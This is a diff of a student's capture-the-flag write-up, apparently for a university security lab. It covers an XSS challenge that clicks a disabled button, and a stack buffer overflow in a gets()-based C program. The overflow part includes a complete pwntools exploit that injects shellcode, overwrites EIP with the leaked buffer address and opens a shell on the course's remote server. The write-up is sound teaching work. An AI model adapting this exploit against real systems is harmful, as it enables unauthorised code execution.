@@ -107,17 +107,121 @@ you cannot switch to the Text mode, can you still launch a successful attack?
 
 
 
-## **CTF Week #10**
+## **CTF 10**
 
-### **CTF Week #10 1**
+## **Taks 1**
+
+The strategy to solve this CTF was using XSS attack, and waiting 2 minutes for the administrator approval, therefore getting the flag.
+
+### **Triggering and alert using the XSS vulnerabiltity**
+
+|Script| Alert Trigger |
+|:---------:|:---------:|
+|![Terminal print of lab task1](img/Week10/1-1.jpeg) |![Terminal print of lab task1](img/Week10/1-2.jpeg) | 
+
+### **Using XSS to click on disabled button**
+|Script| WebPage  |
+|:---------:|:---------:|
+|![Terminal print of lab task1](img/Week10/1-3.jpeg) |![Terminal print of lab task1](img/Week10/1-4.jpeg) | 
+
+### **Getting the flag**
+
+According to the CTF guide the page refresh every 5 seconds, and the administrator approval migth take 2 minutes. Therefore after triggering the disabled button click, we waited 2 minutes and the flag popped in the screen.
+
+| WebPage |
+|:---------:|
+|![Terminal print of lab task1](img/Week10/1-5.jpeg) | 
 
 
-### **CTF Week #10 2**
+## **Task 2**
 
-#### **Checksec**
+### **Checksec**
 
-- Address randomization is active
-- Regions in the memory with RWX permissions
-- No cannaries in the stack
-- Architecture is x86
-- Stack has execute permissions (NX -no execute- disabled)
+* 32bits architecture 
+* No RELRO
+* No stack canary found
+* NX disabled 
+* Address Randomization enabled
+* Has RWX segments
+
+### **Attack analysis**
+
+By running **checksec** in the binary we can see, that NX is disabled and PIE is enabled. Therefore, we know that
+ addresses will be randomized in each execution so we need to play around that. Since NX is disabled, we will probably have to inject some shellcode.
+
+|Terminal 1 |
+|:---------:|
+|![Terminal print of lab task1](img/Week10/ctf10_5.png) | 
+
+### **Code analysis**
+
+Since we have the source code, we don't need to use ghydra to reverse engineer the binary nor dissamble the main function, to find the vulnerability. We have a **BOF** vulnerability in __gets()__ function, where we can read more than 100 bits to a buffer that only takes 100 bits, therefore causing a crash, and a possible exploitation.
+
+```c
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    int main() {
+        char buffer[100];
+
+        printf("Try to control this program.\n");
+        printf("Your buffer is %p.\n", buffer);
+        printf("Give me your input:\n");
+        fflush(stdout);
+    
+        gets(buffer);
+        
+        return 0;
+    }
+```
+### **Executing the binary**
+
+By executing the binary given, we see that we get a base stack address leak and we will work around that to defeat the address randomization, therefore bypassing the **PIE** protection.
+
+|Terminal 1 |
+|:---------:|
+|![Terminal print of lab task1](img/Week10/ctf10-2-2.png) | 
+
+### **Find the offset between the buffer and EIP**
+
+We will now see how many characters we need to write from the base address to start overwritting the instruction pointer. To calculate this we used **GDB** pattern create tool to find this offset. To verify if **GDB** **EIP** offset was correct we used **radare2 wop0**, and found that **GDB EIP** offset was off by 1. Being **108 bits** the correct offset.
+
+|Terminal 1 |
+|:---------:|
+|![Terminal print of lab task1](img/Week10/ctf102-1.png)  | 
+
+### **Writing the exploit in a cleaver way**
+
+We see that the distance between the base address and the EIP is 108.
+
+So our stategy will be:
+* Given that we have the leaked stack base address, we will insert the shellcode, crafted using python pwn tools package, then overwrite the buffer until we get to **EIP** and then overwrite **EIP** with the leaked base address, therefore redirecting our code to the shellcode, that is in the leaked stack base address.
+
+```python
+    from pwn import *
+    import re
+
+    from pwnlib.adb.adb import shell
+
+    #p = process("./program")
+
+    e = context.binary = ELF("./program")
+    p = remote("ctf-fsi.fe.up.pt",4001)
+
+    #gdb.attach(p.pid)
+
+    shellcode = asm(shellcraft.sh())
+
+    p.recvuntil("buffer is ")
+
+    stack_base = int(p.recv(10),16)
+
+    payload = asm(shellcraft.sh())
+
+    payload = payload.ljust(108,b'A')
+
+    payload += p32(stack_base)
+
+    p.sendlineafter("input:",payload)
+    p.interactive()
+```
